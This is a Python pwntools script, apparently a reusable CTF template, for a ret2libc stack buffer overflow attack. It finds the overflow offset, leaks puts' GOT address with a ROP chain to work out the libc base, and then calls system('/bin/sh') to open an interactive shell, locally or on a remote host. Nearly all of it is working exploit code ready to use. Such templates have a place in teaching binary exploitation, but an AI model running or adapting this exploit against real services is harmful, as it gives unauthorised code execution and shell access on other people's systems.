from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64  # Import pwntools


####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = "./vuln"
REMOTE_BIN = "~/vuln" #For ssh
LIBC = "" #ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('10.10.10.10',1339) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example "break *main"
    gdb.attach(P.pid, "b *main")



##########################
##### OFFSET FINDER ######
##########################

OFFSET = b"" #b"A"*264
if OFFSET == b"":
    gdb.attach(P.pid, "c") #Attach and continue
    payload = cyclic(264)
    payload += b"AAAAAAAA"
    print(P.clean())
    P.sendline(payload)
    #x/wx $rsp -- Search for bytes that crashed the application
    #print(cyclic_find(0x63616171)) # Find the offset of those bytes
    P.interactive()
    exit()



#####################
#### Find Gadgets ###
#####################
try:
    libc_func = "puts"
    PUTS_PLT = ELF_LOADED.plt['puts'] #PUTS_PLT = ELF_LOADED.symbols["puts"] # This is also valid to call puts
except:
    libc_func = "printf"
    PUTS_PLT = ELF_LOADED.plt['printf']

MAIN_PLT = ELF_LOADED.symbols['main']
POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (ROP_LOADED.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
log.info("ret gadget: " + hex(RET))


#########################
#### Finf LIBC offset ###
#########################

def generate_payload_aligned(rop):
    payload1 = OFFSET + rop
    if (len(payload1) % 16) == 0:
        return payload1
    
    else:
        payload2 = OFFSET + p64(RET) + rop
        if (len(payload2) % 16) == 0:
            log.info("Payload aligned successfully")
            return payload2
        else:
            log.warning(f"I couldn't align the payload! Len: {len(payload1)}")
            return payload1


def get_addr(libc_func):
    FUNC_GOT = ELF_LOADED.got[libc_func]
    log.info(libc_func + " GOT @ " + hex(FUNC_GOT))
    # Create rop chain
    rop1 = p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
    rop1 = generate_payload_aligned(rop1)

    # Send our rop-chain payload
    #P.sendlineafter("dah?", rop1) #Use this to send the payload when something is received
    print(P.clean()) # clean socket buffer (read all and print)
    P.sendline(rop1)

    # If binary is echoing back the payload, remove that message
    recieved = P.recvline().strip()
    if OFFSET[:30] in recieved:
        recieved = P.recvline().strip()
    
    # Parse leaked address
    log.info(f"Len rop1: {len(rop1)}")
    leak = u64(recieved.ljust(8, b"\x00"))
    log.info(f"Leaked LIBC address,  {libc_func}: {hex(leak)}")
    
    # Set lib base address
    if LIBC:
        LIBC.address = leak - LIBC.symbols[libc_func] #Save LIBC base
        log.info("LIBC base @ %s" % hex(LIBC.address))

    # If not LIBC yet, stop here
    else:
        print("TO CONTINUE) Find the LIBC library and continue with the exploit... (https://LIBC.blukat.me/)")
        P.interactive()
    
    return hex(leak)

get_addr(libc_func) #Search for puts address in memmory to obtain LIBC base



##############################
##### FINAL EXPLOITATION #####
##############################

BINSH = next(LIBC.search(b"/bin/sh")) #Verify with find /bin/sh
SYSTEM = LIBC.sym["system"]
EXIT = LIBC.sym["exit"]

log.info("POP_RDI %s " % hex(POP_RDI))
log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
log.info("exit %s " % hex(EXIT))

rop2 = p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) #p64(EXIT)
rop2 = generate_payload_aligned(rop2)


P.clean()
P.sendline(rop2)


P.interactive() #Interact with your shell :)